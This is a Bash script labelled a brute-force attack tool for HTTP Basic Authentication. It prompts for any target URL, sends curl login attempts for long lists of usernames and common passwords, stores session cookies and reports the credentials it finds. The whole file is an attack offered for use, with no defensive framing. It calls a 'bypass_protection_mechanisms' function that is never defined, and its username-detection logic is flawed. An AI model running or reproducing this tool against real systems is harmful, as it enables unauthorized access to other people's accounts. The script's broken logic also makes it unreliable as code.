#!/bin/bash
# This is a comment

# Color constants
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color



# Function to perform Brute Force Attack
brute_force_attack() {
    echo "Starting Brute Force Attack..."
    # Define usernames and passwords
    usernames=("admin" "user" "test" "root" "administrator" "guest" "network" "database" "designer" "customer" "service" "marketing" "sales" "finance"
        "accounting" "hr" "executive" "director" "operations" "it" "tech" "info" "webmaster"
        "backup" "monitoring" "admin1" "user1" "test1" "root1" "administrator1" "guest1"
        "john1" "jane1" "alice1" "bob1" "developer1" "manager1" "support1" "system1" "analyst1"
        "consultant1" "security1" "engineer1" "network1" "database1" "designer1" "customer1"
        "service1" "marketing1" "sales1" "finance1" "accounting1" "hr1" "executive1" "director1"
        "operations1" "it1" "tech1" "info1" "webmaster1" "backup1" "monitoring1" "admin2" "user2"
        "test2" "root2" "administrator2" "guest2" "john2" "jane2" "alice2" "bob2" "developer2"
        "manager2" "support2" "system2" "analyst2" "consultant2" "security2" "engineer2" "network2"
        "database2" "designer2" "customer2" "service2" "marketing2" "sales2" "finance2" "accounting2"
        "hr2" "executive2" "director2" "operations2" "it2" "tech2" "info2" "webmaster2" "backup2"
        "monitoring2" "admin3" "user3" "test3" "root3" "administrator3" "guest3" "john3" "jane3"
        "alice3" "bob3" "developer3" "manager3" "support3" "system3" "analyst3" "consultant3"
        "security3" "engineer3" "network3" "database3" "designer3" "customer3" "service3"
        "marketing3" "sales3" "finance3" "accounting3" "hr3" "executive3" "director3" "operations3"
        "it3" "tech3" "info3" "webmaster3" "backup3" "monitoring3" "admin4" "user4" "test4"
        "root4" "administrator4" "guest4" "john4" "jane4" "alice4" "bob4" "developer4" "manager4"
        "support4" "system4" "analyst4" "consultant4" "security4" "engineer4" "network4"
        "database4" "designer4" "customer4" "service4" "marketing4" "sales4" "finance4"
        "accounting4" "hr4" "executive4" "director4" "operations4" "it4" "tech4" "info4"
        "webmaster4" "backup4" "monitoring4" "admin5" "user5" "test5" "root5" "administrator5"
        "guest5" "john5" "jane5" "alice5" "bob5" "developer5" "manager5" "support5" "system5"
        "analyst5" "consultant5" "security5" "engineer5" "network5" "database5" "designer5"
        "customer5" "service5" "marketing5" "sales5" "finance5" "accounting5" "hr5" "executive5"
        "director5" "operations5" "it5" "tech5" "info5" "webmaster5" "backup5" "monitoring5"
        "admin6" "user6" "test6" "root6" "administrator6" "guest6" "john6" "jane6" "alice6"
        "bob6" "developer6" "manager6" "support6" "system6" "analyst6" "consultant6" "security6"
        "engineer6" "network6" "database6" "designer6" "customer6" "service6" "marketing6"
        "sales6" "finance6" "accounting6" "hr6" "executive6" "director6" "operations6" "it6"
        "tech6" "info6" "webmaster6" "backup6" "monitoring6" "admin7" "user7" "test7" "root7"
        "administrator7" "guest7" "john7" "jane7" "alice7" "bob7" "developer7" "manager7"
        "support7" "system7" "analyst7" "consultant7" "security7" "engineer7" "network7"
        "database7" "designer7" "customer7" "service7" "marketing7" "sales7" "finance7"
        "accounting7" "hr7" "executive7" "director7" "operations7" "it7" "tech7" "info7"
        "webmaster7" "backup7" "monitoring7" "admin8" "user8" "test8" "root8" "administrator8"
        "guest8" "john8" "jane8" "alice8" "bob8" "developer8" "manager8" "support8" "system8"
        "analyst8" "consultant8" "security8" "engineer8" "network8" "database8" "designer8"
        "customer8" "service8" "marketing8" "sales8" "finance8" "accounting8" "hr8" "executive8"
        "director8" "operations8" "it8" "tech8" "info8" "webmaster8" "backup8" "monitoring8"
        "admin9" "user9" "test9" "root9" "administrator9" "guest9" "john9" "jane9" "alice9"
        "bob9" "developer9" "manager9" "support9" "system9" "analyst9" "consultant9" "security9"
        "engineer9" "network9" "database9" "designer9" "customer9" "service9" "marketing9"
        "sales9" "finance9" "accounting9" "hr9" "executive9" "director9" "operations9" "it9"
        "tech9" "info9" "webmaster9" "backup9" "monitoring9" "admin10" "user10" "test10"
        "root10" "administrator10" "guest10" "john10" "jane10" "alice10" "bob10" "developer10"
        "manager10" "support10" "system10" "analyst10" "consultant10" "security10" "engineer10"
        "network10" "database10" "designer10" "customer10" "service10" "marketing10" "sales10"
        "finance10" "accounting10" "hr10" "executive10" "director10" "operations10" "it10"
        "tech10" "info10" "webmaster10" "backup10" "monitoring10" "admin11" "user11" "test11"
        "root11" "administrator11" "guest11" "john11" "jane11" "alice11" "bob11" "developer11"
        "manager11" "support11" "system11" "analyst11" "consultant11" "security11" "engineer11"
        "network11" "database11" "designer11" "customer11" "service11" "marketing11" "sales11"
        "finance11" "accounting11" "hr11" "executive11" "director11" "operations11" "it11"
        "tech11" "info11" "webmaster11" "backup11" "monitoring11")
    passwords=("password123!" "1234567890" "12345678" "12345" "abcdef" "abc123" "123abc" "password1!"
        "qwerty123" "123456a" "1234abcd" "password12" "adminadmin123" "qwertyuiop" "password1234"
        "1234qwer" "1q2w3e4r" "test123" "password123!" "testtest" "1234qwer!" "123123" "111111"
        "password2" "1234qwer" "password!1" "p@ssw0rd" "password12!" "123456789a" "passw0rd"
        "123456789!" "qazwsx" "123qwe" "password!123" "1234abcd!" "password3" "zaq1zaq1" "abc123!"
        "password4" "password23" "passw0rd!" "password11" "password1234!" "password12345" "password22"
        "passw0rd123" "password111" "password5" "password13" "q1w2e3r4" "qwerty123!" "password111!"
        "password21" "password24" "password7" "1qaz2wsx" "pass1234" "pass12345" "pass123456"
        "pass1234567" "pass12345678" "pass123456789" "password1111" "password11111" "password111111"
        "password1111111" "password11111111" "password111111111" "passw0rd1" "passw0rd12" "passw0rd123"
        "passw0rd1234" "passw0rd12345" "passw0rd123456" "passw0rd1234567" "passw0rd12345678"
        "passw0rd123456789" "P@ssword1" "P@ssword12" "P@ssword123" "P@ssword1234" "P@ssword12345"
        "P@ssword123456" "P@ssword1234567" "P@ssword12345678" "P@ssword123456789" "P@ssw0rd1"
        "P@ssw0rd12" "P@ssw0rd123" "P@ssw0rd1234" "P@ssw0rd12345" "P@ssw0rd123456" "P@ssw0rd1234567"
        "P@ssw0rd12345678" "P@ssw0rd123456789" "password!" "password!!" "password!!!" "password123!!"
        "password123!!!" "password1234!!" "password1234!!!" "password12345!!" "password12345!!!"
        "password123456!!" "password123456!!!" "password1234567!!" "password1234567!!!" "password12345678!!"
        "password12345678!!!" "password123456789!!" "password123456789!!!" "password1234567890!!"
        "password1234567890!!!" "P@ssw0rd!" "P@ssw0rd!!" "P@ssw0rd!!!" "P@ssw0rd123!!" "P@ssw0rd123!!!"
        "P@ssw0rd1234!!" "P@ssw0rd1234!!!" "P@ssw0rd12345!!" "P@ssw0rd12345!!!" "P@ssw0rd123456!!"
        "P@ssw0rd123456!!!" "P@ssw0rd1234567!!" "P@ssw0rd1234567!!!" "P@ssw0rd12345678!!"
        "P@ssw0rd12345678!!!" "P@ssw0rd123456789!!" "P@ssw0rd123456789!!!" "P@ssw0rd1234567890!!"
        "P@ssw0rd1234567890!!!" "p@ssw0rd!" "p@ssw0rd!!" "p@ssw0rd!!!" "p@ssw0rd123!!" "p@ssw0rd123!!!"
        "p@ssw0rd1234!!" "p@ssw0rd1234!!!" "p@ssw0rd12345!!" "p@ssw0rd12345!!!" "p@ssw0rd123456!!"
        "p@ssw0rd123456!!!" "p@ssw0rd1234567!!" "p@ssw0rd1234567!!!" "p@ssw0rd12345678!!"
        "p@ssw0rd12345678!!!" "p@ssw0rd123456789!!" "p@ssw0rd123456789!!!" "p@ssw0rd1234567890!!"
        "p@ssw0rd1234567890!!!" "Passw0rd!" "Passw0rd!!" "Passw0rd!!!" "Passw0rd123!!" "Passw0rd123!!!"
        "Passw0rd1234!!" "Passw0rd1234!!!" "Passw0rd12345!!" "Passw0rd12345!!!" "Passw0rd123456!!"
        "Passw0rd123456!!!" "Passw0rd1234567!!" "Passw0rd1234567!!!" "Passw0rd12345678!!"
        "Passw0rd12345678!!!" "Passw0rd123456789!!" "Passw0rd123456789!!!" "Passw0rd1234567890!!"
        "Passw0rd1234567890!!!" "passWord!" "passWord!!" "passWord!!!" "passWord123!!" "passWord123!!!"
        "passWord1234!!" "passWord1234!!!" "passWord12345!!" "passWord12345!!!" "passWord123456!!"
        "passWord123456!!!" "passWord1234567!!" "passWord1234567!!!" "passWord12345678!!"
        "passWord12345678!!!" "passWord123456789!!" "passWord123456789!!!" "passWord1234567890!!"
        "passWord1234567890!!!" "PASSWORD!" "PASSWORD!!" "PASSWORD!!!" "PASSWORD123!!" "PASSWORD123!!!"
        "PASSWORD1234!!" "PASSWORD1234!!!" "PASSWORD12345!!" "PASSWORD12345!!!" "PASSWORD123456!!"
        "PASSWORD123456!!!" "PASSWORD1234567!!" "PASSWORD1234567!!!" "PASSWORD12345678!!"
        "PASSWORD12345678!!!" "PASSWORD123456789!!" "PASSWORD123456789!!!" "PASSWORD1234567890!!"
        "PASSWORD1234567890!!!" "passWord!" "passWord!!" "passWord!!!" "passWord123!!" "passWord123!!!"
        "passWord1234!!" "passWord1234!!!" "passWord12345!!" "passWord12345!!!" "passWord123456!!"
        "passWord123456!!!" "passWord1234567!!" "passWord1234567!!!" "passWord12345678!!"
        "passWord12345678!!!" "passWord123456789!!" "passWord123456789!!!" "passWord1234567890!!"
        "passWord1234567890!!!" "PASSWORD!" "PASSWORD!!" "PASSWORD!!!" "PASSWORD123!!" "PASSWORD123!!!"
        "PASSWORD1234!!" "PASSWORD1234!!!" "PASSWORD12345!!" "PASSWORD12345!!!" "PASSWORD123456!!"
        "PASSWORD123456!!!" "PASSWORD1234567!!" "PASSWORD1234567!!!" "PASSWORD12345678!!"
        "PASSWORD12345678!!!" "PASSWORD123456789!!" "PASSWORD123456789!!!" "PASSWORD1234567890!!"
        "PASSWORD1234567890!!!" "P@ssword!" "P@ssword!!" "P@ssword!!!" "P@ssword123!!" "P@ssword123!!!"
        "P@ssword1234!!" "P@ssword1234!!!" "P@ssword12345!!" "P@ssword12345!!!" "P@ssword123456!!"
        "P@ssword123456!!!" "P@ssword1234567!!" "P@ssword1234567!!!" "P@ssword12345678!!"
        "P@ssword12345678!!!" "P@ssword123456789!!" "P@ssword123456789!!!" "P@ssword1234567890!!"
        "P@ssword1234567890!!!" "password!1" "password!12" "password!123" "password!1234"
        "password!12345" "password!123456" "password!1234567" "password!12345678" "password!123456789"
        "password!!1" "password!!12" "password!!123" "password!!1234" "password!!12345"
        "password!!123456" "password!!1234567" "password!!12345678" "password!!123456789"
        "password!!!1" "password!!!12" "password!!!123" "password!!!1234" "password!!!12345"
        "password!!!123456" "password!!!1234567" "password!!!12345678" "password!!!123456789" )

    # Iterate over usernames
    for username in "${usernames[@]}"; do
        # Check if username is correct
        echo -e "${YELLOW}Trying username: $username${NC}"
        status_code=$(curl -s -o response.txt -w "%{http_code}" -u "$username:" "$1")
        response=$(<response.txt)
        echo -e "${BLUE}URL: $1${NC}"
        echo -e "Response Code: ${GREEN}$status_code${NC}"
        echo -e "Response Content:\n${GREEN}$response${NC}"
        if [ "$status_code" == "200" ]; then
            echo -e "${GREEN}Correct username found: $username${NC}"
            # If username is correct, iterate over passwords
            for password in "${passwords[@]}"; do
                echo -e "${YELLOW}Trying password: $password${NC}"
                status_code=$(curl -s -o response.txt -w "%{http_code}" -u "$username:$password" "$1")
                response=$(<response.txt)
                echo -e "${BLUE}URL: $1${NC}"
                echo -e "Response Code: ${GREEN}$status_code${NC}"
                echo -e "Response Content:\n${GREEN}$response${NC}"
                if [ "$status_code" == "200" ]; then
                    echo -e "${GREEN}Correct credentials found: $username:$password${NC}"
                    # Attempt to log in
                    echo -e "${YELLOW}Attempting to log in with correct credentials...${NC}"
                    login_status_code=$(curl -s -o response.txt -w "%{http_code}" -u "$username:$password" --data-urlencode "username=$username" --data-urlencode "password=$password" --cookie-jar cookies.txt "$1/login")
                    login_response=$(<response.txt)
                    echo -e "${BLUE}URL: $1/login${NC}"
                    echo -e "Response Code: ${GREEN}$login_status_code${NC}"
                    echo -e "Response Content:\n${GREEN}$login_response${NC}"
                    if [ "$login_status_code" == "200" ]; then
                        echo -e "${GREEN}Successfully logged in.${NC}"
                        echo -e "${YELLOW}To regenerate the login URL: ${NC}${BLUE}$1/login${NC}"
                        exit 0
                    else
                        # Analyze login test response content for protection systems
                        echo -e "${YELLOW}Analyzing login test response content for protection systems...${NC}"
                        # Attempt to bypass protection mechanisms
                        bypass_protection_mechanisms "$login_response"
                    fi
                fi
            done
            echo -e "${RED}Failed to find correct password for username: $username${NC}"
            exit 1
        elif [ "$status_code" == "401" ]; then
            echo -e "${RED}Unauthorized: Protection mechanisms detected.${NC}"
            # Attempt to bypass protection mechanisms
            echo -e "${YELLOW}Attempting to bypass protection mechanisms...${NC}"
            # Add bypass logic here (e.g., session handling, CAPTCHA solving)
            # For demonstration purposes, we'll retry with a common password
            for password in "${passwords[@]}"; do
                echo -e "${YELLOW}Trying password: $password${NC}"
                status_code=$(curl -s -o response.txt -w "%{http_code}" -u "$username:$password" "$1")
                response=$(<response.txt)
                echo -e "${BLUE}URL: $1${NC}"
                echo -e "Response Code: ${GREEN}$status_code${NC}"
                echo -e "Response Content:\n${GREEN}$response${NC}"
                if [ "$status_code" == "200" ]; then
                    echo -e "${GREEN}Correct credentials found: $username:$password${NC}"
                    # Attempt to log in
                    echo -e "${YELLOW}Attempting to log in with correct credentials...${NC}"
                    login_status_code=$(curl -s -o response.txt -w "%{http_code}" -u "$username:$password" --data-urlencode "username=$username" --data-urlencode "password=$password" --cookie-jar cookies.txt "$1/login")
                    login_response=$(<response.txt)
                    echo -e "${BLUE}URL: $1/login${NC}"
                    echo -e "Response Code: ${GREEN}$login_status_code${NC}"
                    echo -e "Response Content:\n${GREEN}$login_response${NC}"
                    if [ "$login_status_code" == "200" ]; then
                        echo -e "${GREEN}Successfully logged in.${NC}"
                        echo -e "${YELLOW}To regenerate the login URL: ${NC}${BLUE}$1/login${NC}"
                        exit 0
                    else
                        # Analyze login test response content for protection systems
                        echo -e "${YELLOW}Analyzing login test response content for protection systems...${NC}"
                        # Attempt to bypass protection mechanisms
                        bypass_protection_mechanisms "$login_response"
                    fi
                fi
            done
            echo -e "${RED}Failed to bypass protection mechanisms.${NC}"
            exit 1
        fi
    done

    echo -e "${RED}Brute Force Attack finished. No correct credentials found.${NC}"
}

# Main function
main() {
    echo "Brute Force Attack Tool for HTTP Basic Authentication"
    echo "------------------------------------------------------"

    # Prompt for target URL
    read -p "Enter your target URL: " target_url

    # Perform Brute Force Attack
    brute_force_attack "$target_url"
}

# Call main function
main
